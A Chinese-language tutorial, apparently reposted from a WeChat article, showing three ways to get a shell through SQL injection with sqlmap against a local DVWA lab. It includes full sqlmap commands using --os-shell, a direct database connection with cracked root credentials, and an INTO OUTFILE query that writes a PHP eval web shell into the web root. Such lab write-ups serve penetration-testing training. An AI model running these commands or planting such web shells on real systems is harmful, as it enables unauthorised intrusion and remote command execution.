# 使用sqlmap在理想环境下获取shell（mysql）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzk0ODMzNzQ4Mw==&mid=2247483798&idx=1&sn=5e339069c734d356d9ccae63ba0818b6&chksm=c3686fb2f41fe6a452387b71e5ea99c910735207c28b7e4c96ef27dccee6eddc048ae426b5ff&scene=126&sessionid=1681449933#rd](http://mp.weixin.qq.com/s?__biz=Mzk0ODMzNzQ4Mw==&mid=2247483798&idx=1&sn=5e339069c734d356d9ccae63ba0818b6&chksm=c3686fb2f41fe6a452387b71e5ea99c910735207c28b7e4c96ef27dccee6eddc048ae426b5ff&scene=126&sessionid=1681449933#rd)

    

   使用sqlmap神器跑注入时，在理想环境下有多种获取shell的方式，本文使用DVWA漏洞环境来一一演示。

  

一、dba权限且已知网站根目录

dvwa注入页面：

  

![](../Images/06a9b47dd11aa6c9130c02965824ebd6.png)

  

sqlmap跑一下，注意加上cookie，或者直接跑抓到的http包也可以：

  

sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4b5briqabn1j0si2rtdqt3f8e0" --batch

  

![](../Images/538ab577a4409b81e8e9bdc62ccea4fc.png)

  

dba权限：sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4b5briqabn1j0si2rtdqt3f8e0" --is-dba

  

![](../Images/46b41e5537ff731d53e3f2cd3db5bf95.png)

  

由于是自己搭的环境，已知根目录D:\\xampp\\htdocs，实际环境中要利用网站报错或其他信息泄露漏洞找到网站根目录，此方法比较多，比如：PHPinfo文件，访问错误报路径，debug调试开启爆路径或--sql-shell后进行数据库目录查询等，--os-shell获取系统shell：

sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4b5briqabn1j0si2rtdqt3f8e0" --os-shell

  

![](../Images/0ddab4d665115a5be9edf13025d6e3f6.png)

  

选项一为用这几个路径，选项二为用户自己输入，选项三为用用户的字典，选项四为爆破：

  

![](../Images/34208f34c1bb76a41e44eac7cab32f56.png)

  

然后就可以执行命令了：

  

![](../Images/b25ce99c90da0a474336869b1f943e3b.png)

  

二、破解出密码直连数据库获取shell

  

\--passwords获取数据库密码：

  

![](../Images/39246513aeefaf543a1179d3dfb7848a.png)

  

MD5解密密码为root，sqlmap直连数据库：

sqlmap.py -d "mysql://root:root@127.0.0.1:3306/dvwa" --os-shell

  

![](../Images/4428a0e86add1e742ab175e2ff20302f.png)

  

执行系统命令：

  

![](../Images/c4cedea9e1f4c6adafdcb370d4154b7e.png)

  

三、--sql-dba写shell，前提是有写权限

  

![](../Images/810aea1b9c21d7c763a4a176db968116.png)

  

select '<?php @eval($\_GET\[a\]);?>'INTO OUTFILE 'D:\\xampp\\htdocs\\dvwa\\hahah.php';

  

![](../Images/8763d3192b6f1d88a4f9bfe06c998615.png)

  

执行命令：

![](../Images/20ce9d307b3141ea94970e7a2088e238.png)
